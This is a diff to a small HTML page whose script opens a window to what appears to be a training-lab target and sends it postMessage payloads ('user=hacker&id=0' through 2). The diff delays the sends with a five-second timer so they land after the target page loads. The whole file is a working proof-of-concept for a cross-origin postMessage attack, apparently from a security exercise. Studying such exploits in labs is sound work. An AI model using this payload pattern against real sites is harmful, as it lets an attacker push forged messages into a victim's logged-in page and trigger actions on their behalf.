@@ -1,10 +1,14 @@
 <body>
     <script>
         var w = window.open("http://ptl-2d51c14c-feac9354.libcurl.so/","hack");
-        w.postMessage('user=hacker&id=0',"http://ptl-2d51c14c-feac9354.libcurl.so/")
 
-        w.postMessage('user=hacker&id=1',"http://ptl-2d51c14c-feac9354.libcurl.so/")
-        w.postMessage('user=hacker&id=2',"http://ptl-2d51c14c-feac9354.libcurl.so/")
+        setTimeout(()=>{
+            w.postMessage('user=hacker&id=0',"http://ptl-2d51c14c-feac9354.libcurl.so/")
+
+w.postMessage('user=hacker&id=1',"http://ptl-2d51c14c-feac9354.libcurl.so/")
+w.postMessage('user=hacker&id=2',"http://ptl-2d51c14c-feac9354.libcurl.so/")
+        }, 5000)
+        
         // Call to postMessage using w as  a reference to the window 
       </script>
 </body>
